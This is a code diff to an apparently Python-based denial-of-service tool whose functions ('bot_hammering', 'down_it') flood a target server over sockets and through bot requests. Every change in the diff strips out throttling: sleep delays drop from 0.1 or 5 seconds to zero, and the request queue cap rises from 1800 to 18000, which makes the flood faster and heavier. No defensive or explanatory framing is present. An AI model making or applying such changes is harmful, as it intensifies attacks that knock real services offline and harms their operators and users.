@@ -38,7 +38,7 @@ def bot_hammering(url):
 			print("\033[94mbot is hammering...\033[0m")
 			time.sleep(.1)
 	except:
-		time.sleep(.1)
+		time.sleep(.0)
 
 
 def down_it(item):
@@ -53,7 +53,7 @@ def down_it(item):
 			else:
 				s.shutdown(1)
 				print("\033[91mshut<->down\033[0m")
-			time.sleep(.1)
+			time.sleep(.0)
 	except socket.error as e:
 		print("\033[91mno connection! server maybe down\033[0m")
 		#print("\033[91m",e,"\033[0m")
@@ -133,7 +133,7 @@ if __name__ == '__main__':
 	print("\033[94mPlease wait...\033[0m")
 	user_agent()
 	my_bots()
-	time.sleep(5)
+	time.sleep(0)
 	try:
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		s.connect((host,int(port)))
@@ -153,9 +153,9 @@ if __name__ == '__main__':
 		#tasking
 		item = 0
 		while True:
-			if (item>1800): # for no memory crash
+			if (item>18000): # for no memory crash
 				item=0
-				time.sleep(.1)
+				time.sleep(.0)
 			item = item + 1
 			q.put(item)
 			w.put(item)
